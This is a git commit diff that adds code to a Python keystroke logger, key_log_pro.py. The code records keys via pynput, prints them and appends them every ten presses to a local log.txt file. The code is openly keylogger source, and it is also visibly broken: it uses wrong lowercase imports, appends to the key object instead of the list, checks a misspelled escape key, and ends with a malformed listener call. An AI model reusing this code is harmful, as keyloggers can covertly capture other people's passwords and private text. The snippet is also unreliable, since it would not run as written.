7bfdf2f51e4dc65572932ae8eaa959191d5cc9f9
Farhan Bhatti <74499472+fb0801@users.noreply.github.com>
2022-09-11 19:10:35 +0100

    Add files via upload

--- key_log_pro.py
+++ key_log_pro.py
@@ -6,12 +6,30 @@ from pynput.keyboard import key, listener
 count = 0
 keys= []
 
+def write_file(key):
+    #create the file ine and convert key to str to be in txt file
+    with open("log.txt", 'a') as f:
+        for key in keys:
+            f.write(str(key))
+
+
 def on_press(key):
-#function to keep track of key pressed
-    
+    #function to keep track of key pressed
+    global keys, count
+    key.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
 
 def on_release(key):
     #function to know when key has been released
+    if key == key.ecs:
+        return False
     
     
-with listener(on_press = on_press, on_release) as listener
+with listener(on_press = on_press, on_release) as listener:
+    listener.join()
